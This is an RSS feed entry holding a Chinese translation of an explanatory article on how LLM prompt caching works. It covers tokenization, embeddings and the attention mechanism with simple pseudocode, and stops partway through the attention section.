<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Prompt caching 技术是如何实现 1 折的推理成本优化的？]]></title>    <link>https://juejin.cn/post/7605817795629252658</link>    <guid>https://juejin.cn/post/7605817795629252658</guid>    <pubDate>2026-02-13T05:27:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605817795629252658" data-draft-id="7605811866908819465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Prompt caching 技术是如何实现 1 折的推理成本优化的？"/> <meta itemprop="keywords" content="人工智能,LLM,面试"/> <meta itemprop="datePublished" content="2026-02-13T05:27:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Baihai_IDP"/> <meta itemprop="url" content="https://juejin.cn/user/3123071228582343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Prompt caching 技术是如何实现 1 折的推理成本优化的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3123071228582343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Baihai_IDP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T05:27:18.000Z" title="Fri Feb 13 2026 05:27:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>编者按：</strong> 你是否曾好奇过，那些声称能将长文本输入成本降低90%、延迟减少85%的"Prompt Caching"技术，背后究竟缓存了什么？是简单的文本复用，还是某种更深层的计算优化？</p>
<p>我们今天为大家带来的文章，作者的核心观点是：Prompt Caching的本质并非简单的文本字符串缓存，而是对Transformer注意力机制中Key-Value（KV）矩阵计算结果的复用，通过避免重复计算注意力权重来实现成本削减与性能提升。</p>
<p>文章的重点内容包括：第一，从Tokenizer到Embedding再到Transformer的完整技术拆解，帮助读者建立对LLM内部数据流的直觉认知；第二，对注意力机制（Attention）的数学原理进行深入浅出的阐释，详细展示了Query、Key、Value矩阵的计算过程以及Softmax权重分配机制；第三，揭示了"KV Caching"的核心实现逻辑 —— 通过缓存历史token的K、V投影矩阵，使模型在增量生成时只需计算最新token，而非重新处理整个上下文；第四，对OpenAI与Anthropic两种缓存策略的对比分析，指出自动路由与显式控制之间的权衡，以及Temperature等采样参数对缓存机制的零影响。</p>
</blockquote>
<p><strong>作者 | Sam Rose</strong></p>
<p><strong>编译 | 岳扬</strong></p>
<p>撰写本文时，OpenAI 和 Anthropic 的 API 中，缓存的 input token 单价仅为普通 input token 的十分之一。</p>
<p>Anthropic 甚至声称[1]，prompt caching 能将长 prompt 的延迟“最高降低 85%”。而在实际测试中，我发现对于足够长的 prompt，这一说法确实成立。我向 Anthropic 和 OpenAI 各发送了数百次请求，注意到在所有 input token 均被缓存的情况下，首 token 延迟（time-to-first-token latency）出现了明显下降。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2764ce95d6845ac9561176b2e45fd21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=X6TG1R9ac7VLfJuCCkCkXz7on6c%3D" alt="image.png" loading="lazy"/></p>
<p>缓存 token（cached token）到底是什么玩意儿？ </p>
<p>这背后究竟发生了什么，让服务商能给 input token 打出 1 折的超低折扣？他们在各次请求之间到底保存了什么？这可不是简单地把响应结果存下来，等收到相同 prompt 时再复用 —— 通过 API 就能很容易地验证这一点并未发生。<strong>随便写个 prompt，连续发送十几次，你会发现即使使用情况栏（usage 部分）显示 input token 已被缓存，每次得到的回复仍然各不相同。</strong></p>
<p>我对大模型厂商文档中的解释[2-3]并不满意 —— 它们虽能很好地说明如何使用 prompt caching，却巧妙地避开了“究竟缓存了什么”这个核心问题。于是我决定深入探究，一头扎进 LLM 工作原理的“兔子洞”，直到彻底搞明白服务商究竟缓存了哪些精确的数据、这些数据的用途，以及它们如何让每个人的 LLM 请求都变得更快速、更便宜。</p>
<p>读完本文，你将……</p>
<ul>
<li>在更深层次上理解 LLM 的工作原理</li>
<li>对“LLM 的运作方式”建立新的直觉认知</li>
<li>弄明白究竟哪些二进制数据被缓存了，以及它们如何降低你的 LLM 请求成本</li>
</ul>
<h2 data-id="heading-0"><strong>01 LLM 架构</strong></h2>
<p>本质上，LLM 就是一个巨大的数学函数：输入一串数字，并输出一个数字。在 LLM 内部，存在着一个由数十亿个精心设计的运算构成的巨型图结构，负责将这些输入数字转化为输出数字。</p>
<p>这个由海量数学运算构成的巨型图结构大致可分为 4 个部分。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e23abc23589f4d2d85e4fc84f523cd75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=4N5FySyn4F3NdZPwakxjBlOKtc8%3D" alt="image.png" loading="lazy"/></p>
<p><strong>图中的每个节点都可以看作一个函数，接收输入并产生输出。输入会以循环方式不断馈入 LLM，直到遇到某个特殊的输出值指示其停止。</strong> 用伪代码表示大致如下：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">prompt</span> =<span class="hljs-string">"What is the meaning of life?"</span><span class="hljs-comment">;</span>

<span class="hljs-attr">tokens</span> = tokenizer(prompt)<span class="hljs-comment">;</span>
while(true){
 <span class="hljs-attr">embeddings</span> = embed(tokens)<span class="hljs-comment">;</span>
for(<span class="hljs-section">[attention, feedforward]</span> of transformers){
 <span class="hljs-attr">embeddings</span> = attention(embeddings)<span class="hljs-comment">;</span>
 <span class="hljs-attr">embeddings</span> = feedforward(embeddings)<span class="hljs-comment">;</span>
}
 <span class="hljs-attr">output_token</span> = output(embeddings)<span class="hljs-comment">;</span>
if(<span class="hljs-attr">output_token</span> === END_TOKEN){
break<span class="hljs-comment">;</span>
}
 tokens.push(output_token)<span class="hljs-comment">;</span>
}

print(decode(tokens))<span class="hljs-comment">;</span>
</code></pre>
<p>尽管以上描述已大幅简化，但现代 LLM 的核心代码行数之少仍让我感到意外。</p>
<p>Sebastian Raschka[4] 用 PyTorch 从零实现了多个开源模型，还产出了大量高质量的教学材料 —— 如果你喜欢本文，大概率也会喜欢他的内容。以当前领先的开源模型之一 Olmo 3 为例，其核心代码仅数百行[5]。</p>
<p>Prompt caching 发生在 Transformer 的“attention（注意力机制）”中。接下来我们将按顺序逐步拆解 LLM 的工作原理，直到抵达这一环节。这意味着，我们的旅程得从 tokens 说起。</p>
<h2 data-id="heading-1"><strong>02 Tokenizer（分词器）</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba85563fcf4c4406a7a511e49c71cb20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=h0BtIta1GQt2UOqqDb3rzws01Ks%3D" alt="image.png" loading="lazy"/></p>
<p>在 LLM 处理你的 prompt（提示词）之前，必须先将其转换为它能理解的表示形式。这个过程分为两步，由 tokenizer 和 embedding 共同完成。为什么要这么做，要到讲 embedding 时才能完全明晰，现在请先耐心了解 tokenizer 的作用。</p>
<p>Tokenizer 会将你的 prompt 拆成多个小片段，并为每个唯一的片段分配一个整数 ID，称为"token"。例如，GPT-5 对 prompt "Check out ngrok.ai" 的分词结果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0b2175da11a47a6bf8e9c33b4f76f1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=9JcvcEfOFkw6qOgbmkg0lWuIiTc%3D" alt="image.png" loading="lazy"/></p>
<p>该 prompt 已被拆分为数组 [“Check”, " out", " ng", “rok”, “.ai”]，并转换为 tokens [4383, 842, 1657, 17690, 75584]。相同的 prompt 始终生成相同的 tokens。tokens 也是区分大小写的 —— 因为大小写能传递语义信息。例如，首字母大写的 "Will" 更可能是人名，而小写的 "will" 则更可能是助动词。</p>
<p>为什么不直接按空格或字符分割？</p>
<p>这其实是个相当深刻的问题，细讲起来足以让本文篇幅翻倍。简短而不尽兴的答案是：这是一种权衡。若想深入理解，Andrej Karpathy 有一期从零实现 tokenizer 的精彩视频（<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DzduSFxRajkE%25EF%25BC%2589" target="_blank" title="https://www.youtube.com/watch?v=zduSFxRajkE%EF%BC%89" ref="nofollow noopener noreferrer">www.youtube.com/watch?v=zdu…</a> 。<strong>对于 prompt caching 而言，只需知道：tokenization 的作用就是把文本变成数字。</strong></p>
<p>Tokens 是 LLM 输入与输出的基本单位。当你向 ChatGPT 提问时，回复会随着每次 LLM 迭代完成而逐个 token 流式返回。服务商这么做，是因为生成完整回复可能需要数十秒，而一旦 token 生成就立即返回，能让交互体验更流畅自然。</p>
<p>我们来问一个 LLM 领域的经典问题，亲眼看看这个过程：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f623bb995c1a49c6b48737c31c789714~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=hO24WCOIn3KcV0ODEkx2P9HJAgU%3D" alt="image.png" loading="lazy"/></p>
<p>Prompt tokens 输入，✨ AI 魔法发生 ✨，输出一个 token，循环往复。这个过程称为“inference（推理）”。注意：每个输出 token 都会在下一轮迭代前被追加到 input prompt 中。LLM 需要全部上下文才能给出高质量回答 —— 如果只输入原始 prompt，它会反复尝试生成答案的第一个 token。如果只输入已生成的回答部分，它会立刻忘记问题本身。因此，每一轮迭代都必须将完整的 prompt 加上已生成的回答内容重新输入 LLM。</p>
<p><strong>那个 199999  token 是什么？</strong></p>
<p>这个推理过程总得有个终点。<strong>LLM 拥有多种“特殊”token，其中之一就是标志着响应结束的 token。</strong> 在 GPT-5 的分词器中，这就是 token 199999。这只是 LLM 终止生成过程的多种方式之一：<strong>你也可以通过 API 指定最大生成 token 数，服务商还可能基于安全策略设定其他终止规则。</strong></p>
<p>此外还有用于标记对话消息起止的特殊 token —— 正是这些 token 让 ChatGPT、Claude 等聊天模型能分辨一条消息何时结束、下一条何时开始。</p>
<p>关于 tokenizer（分词器）的最后一点：它们种类繁多！ChatGPT 使用的 tokenizer 与 Claude 不同，甚至 OpenAI 自家的不同模型也使用不同的 tokenizer。每种 tokenizer 都有自己独特的文本切分规则。如果你想直观比较不同 tokenizer 的分词效果，可以试试 tiktokenizer[6]。</p>
<p>认识了 tokens 之后，接下来我们聊聊 embeddings。</p>
<h2 data-id="heading-2"><strong>03 Embedding</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52de7bad6c8b4ede900ea19a292df5fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=nM75RjxsYx20JVfxRP8vm3nARhM%3D" alt="image.png" loading="lazy"/></p>
<p>经过 tokenizer 处理后的 tokens，现在进入 embedding 阶段。要理解 embedding，不妨先思考模型的目标是什么。</p>
<p>人类用代码解决问题时，会编写接收输入、产生输出的函数，比如华氏转摄氏：</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">fahrenheitToCelsius</span>(fahrenheit){
<span class="hljs-built_in">return</span>((fahrenheit -<span class="hljs-number">32</span>)*<span class="hljs-number">5</span>)/<span class="hljs-number">9</span>;
}
</code></pre>
<p>我们可以把任意数字传入 fahrenheitToCelsius，并能获得正确结果。但假如我们面对一个问题，却不知道背后的公式呢？假如我们只有下面这张神秘的输入-输出对照表：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f04832306da4348b9736a7d55fd8eaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=%2BdTHSm5VPy%2F7SzIMrZ%2BVLKq8PMs%3D" alt="图片" loading="lazy"/></p>
<p>（我并不指望你能认出这个函数 —— 不过，如果你把截图贴进 ChatGPT，它能立刻识别出来。）</p>
<p>当我们知道每个输入对应的正确输出，却不知道产生这种对应关系的函数时，就可以“训练”一个模型来学习这个函数。做法是：给模型提供一块“画布” —— 那个由海量数学运算构成的巨型图结构，然后不断调整这个图结构，直到模型收敛到正确的函数。每次更新图结构后，我们都将输入数据喂进去，观察输出数据与目标的差距。反复迭代，直到结果足够接近目标。这就是训练的本质。</p>
<p>事实证明，在训练文本生成模型时，能够识别两个句子是否“相似”会很有帮助。但“相似”具体指什么？它们可能同样悲伤、幽默或发人深省；也可能在长度、节奏、语气、语言、词汇或结构上相近。描述句子相似性的方式有无数维度，而两个句子可能在某些维度上相似，在另一些维度上则不然。</p>
<p><strong>Tokens 本身只是简单的整数编号，没有任何“维度”信息；而 embeddings 则是高维向量，承载了丰富的语义和结构信息。</strong></p>
<p>Embedding 是一个长度为 n 的数组，代表 n 维空间中的一个位置。如果 n=3，embedding 可能是 [10, 4, 2]，表示三维空间中 x=10、y=4、z=2 的坐标点。在 LLM 训练过程中，每个 token 会被随机分配一个起始位置，随后训练过程会不断微调所有 token 的位置，直到找到能产生最佳输出的排列方式。</p>
<p>Embedding 阶段的第一步，就是查表获取每个 token 对应的 embedding。用伪代码表示大概是这样：</p>
<pre><code class="hljs language-ini" lang="ini">// Created during training, never changes during inference.
const <span class="hljs-attr">EMBEDDINGS</span> = [...]<span class="hljs-comment">;</span>
 
function embed(tokens) {
 return tokens.map(<span class="hljs-attr">token</span> =&gt; {
 return EMBEDDINGS<span class="hljs-section">[token]</span><span class="hljs-comment">;</span>
 })<span class="hljs-comment">;</span>
}
</code></pre>
<p>于是，我们把 tokens（整数数组）转换成了 embeddings（数组的数组，即“矩阵”）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3fe6b77a8a34f88bde24bde2b8c361e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=M0OPQI8Nqk8TpPSy4sxYCCTP58w%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e95661b89e643028dda2e13a0f08ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=oWqWH8AKM%2BoqjMNpHxWeJ0LDeos%3D" alt="image.png" loading="lazy"/></p>
<p>tokens [75, 305, 284, 887] 被转换为一个由 3 维 embeddings 构成的矩阵。</p>
<p><strong>Embedding 的维度越多，模型可用于比较句子的“角度”就越多。</strong> 我们刚才一直在用 3 维 embeddings 举例，但当前主流模型的 embedding 维度通常是几千维，最大的甚至超过 10,000 维。</p>
<p>为了说明更高维度的价值，下面我展示了 8 组彩色形状，它们最初位于一维空间中 —— 挤在一条直线上，杂乱无章，难以理解。但随着维度增加，你就能清楚地看到存在 8 个不同的、相关的组别。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e158d605cc453080698f9eb2abe70c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=U9%2BjWt9inP2iu%2BMpxux2JFTussc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f94e90f2dd0045ac8069a2a7f634e58d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=rH0QWYRyOYNU8E4ALhOZKTeB9aY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed7faaf0c6e14d329251ca65e250872a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=YALz8yr0sbw4dr7E7gOxDr3VJws%3D" alt="image.png" loading="lazy"/></p>
<p>三维是我这里能提供的视觉示例的极限，至于几千维的空间能表达什么，就得靠你发挥想象力了。</p>
<p>Embedding 阶段还有最后一件事要做。<strong>在获取 token 的 embedding 后，会将该 token 在 prompt 中的位置信息编码进 embedding 中。</strong> 我没有深入研究这一机制的具体实现方式，只知道它对 prompt caching 的工作方式影响不大，但如果没有这一步，LLM 就无法判断 prompt 中 tokens 的先后顺序。</p>
<p>更新一下前面的伪代码，假设存在一个叫 encodePosition 的函数，它接收 embeddings 和位置信息，并返回嵌入了位置编码的新 embeddings。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">EMBEDDINGS</span> =[...];
 
<span class="hljs-comment">// Input: array of tokens (integers)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">embed</span>(<span class="hljs-params">tokens</span>){
<span class="hljs-comment">// Output: array of n-dimensional embedding arrays</span>
<span class="hljs-keyword">return</span> tokens.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">token, i</span>)=&gt;</span>{
 <span class="hljs-keyword">const</span> embeddings = <span class="hljs-variable constant_">EMBEDDINGS</span>[token];
<span class="hljs-keyword">return</span> <span class="hljs-title function_">encodePosition</span>(embeddings, i);
});
}
</code></pre>
<p>总而言之，embeddings 是 n 维空间中的点，你可以将其视为它们所代表文本的语义含义。<strong>在训练过程中，每个 token 都会在该空间中移动，靠近其他语义相似的 token。维度越多，LLM 对每个 token 的表示就越复杂、越细腻。</strong></p>
<p>至此，tokenizer 和 embedding 阶段所做的全部工作，都是为了把原始文本转换成 LLM 能处理的形式。接下来，我们来看看这些数据进入 transformer 阶段后会发生什么。</p>
<h2 data-id="heading-3"><strong>04 Transformer</strong></h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/953ad94df0c840f5a6566dcedae4f404~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=aH2M8hxE6kLJrKQiRYJTe719DcU%3D" alt="image.png" loading="lazy"/></p>
<p>Transformer 阶段的核心任务，就是接收 embeddings 作为输入，并在 n 维空间中对它们进行调整。它通过两种方式实现这一点，而我们只关注第一种：attention（注意力机制）。我们暂不讨论 “Feedforward” 层或输出阶段（至少在这篇文章中👀）。</p>
<p><strong>Attention 机制的作用，是帮助 LLM 理解 prompt 中各个 token 之间的关系 —— 具体做法是让每个 token 能够影响其他 token 在 n 维空间中的位置。</strong> 它通过加权组合 prompt 中所有 token 的 embeddings 来实现这一点。输入是整个 prompt 的 embeddings，输出则是一个新的 embedding，它是所有输入 embeddings 的加权组合。</p>
<p>举个例子，如果 prompt 是 “Mary had a little”，被分词为四个 token：Mary、had、a、little，那么 attention 机制可能会决定，在生成下一个 token 时，模型会认为：</p>
<ul>
<li>“Mary” 最重要（63%）（译者注：因为整个句子的主语是 Mary，后续内容很可能围绕她展开）</li>
<li>“had” 和 “a” 次之（16% 和 12%）（译者注：它们是语法结构的一部分，但语义信息较弱）</li>
<li>“little” 也有一定作用（9%）（译者注：它修饰后面的名词）</li>
</ul>
<p>然后，它会把所有 token 的 embeddings 分别乘以对应的权重，然后把结果加在一起，得到一个融合后的向量。这正是 LLM 判断“在当前上下文中，每个 token 应该被关注多少”的方式。</p>
<p>这是目前为止整个流程中最复杂、最抽象的部分。我会先用伪代码展示它，然后再看看 embeddings 在经过这一过程时是如何被变换的。我本想让这一部分的数学内容少一些，但这里很难避免一些数学运算。别担心，你能行的，我相信你。</p>
<p>Attention 中的大部分计算都是矩阵乘法。对于本文而言，你只需知道：输出矩阵的形状由两个输入矩阵的形状决定，输出的行数等于第一个输入矩阵的行数，列数等于第二个输入矩阵的列数。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcfe0f6e2a924a2b8735ca4334166f00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=mGBYYF0i2S8z2r3WszZkbJ7ivGA%3D" alt="image.png" loading="lazy"/></p>
<p>理解了这一点，我们来看一个简化版的注意力机制如何计算分配给每个 token 的权重。在以下代码中，我用 * 表示矩阵乘法。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Similar to EMBEDDINGS from the pseudocode</span>
<span class="hljs-comment">// earlier, WQ and WK are learned during </span>
<span class="hljs-comment">// training and do not change during inference.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// These are both n*n matrices, where n is the</span>
<span class="hljs-comment">// number of embedding dimensions. In our example</span>
<span class="hljs-comment">// above, n =3.</span>
const WQ =<span class="hljs-selector-attr">[[...]</span>,<span class="hljs-selector-attr">[...]</span>,<span class="hljs-selector-attr">[...]</span>];
const WK =<span class="hljs-selector-attr">[[...]</span>,<span class="hljs-selector-attr">[...]</span>,<span class="hljs-selector-attr">[...]</span>];

<span class="hljs-comment">// The input embeddings look like this:</span>
<span class="hljs-comment">//[</span>
<span class="hljs-comment">//[-0.1,0.1,-0.3],// Mary</span>
<span class="hljs-comment">//[1.0,-0.5,-0.6],// had</span>
<span class="hljs-comment">//[0.0,0.8,0.6],// a</span>
<span class="hljs-comment">//[0.5,-0.7,1.0]// little</span>
<span class="hljs-comment">//]</span>
function <span class="hljs-built_in">attentionWeights</span>(embeddings){
 const <span class="hljs-selector-tag">Q</span> = embeddings * WQ;
 const K = embeddings * WK;
 const scores = <span class="hljs-selector-tag">Q</span> * <span class="hljs-built_in">transpose</span>(K);
 const masked = <span class="hljs-attribute">mask</span>(scores);
return <span class="hljs-built_in">softmax</span>(masked);
}
</code></pre>
<p>接下来，让我们看看 embedding 在流经这个函数时是如何变化的。</p>
<p>等等，WQ 和 WK 变量到底是什么？</p>
<p>还记得我之前说过，每个 token 的 embedding 最初都被随机分配了一个位置，然后在训练过程中不断微调，直到模型找到一个良好的排列状态吗？</p>
<p>WQ 和 WK 也是类似的。它们是 n×n 的矩阵（n 即 embedding 维度），在训练开始时被赋予随机值，随后也在训练中被不断调整，以帮助模型收敛到一个更优的解。</p>
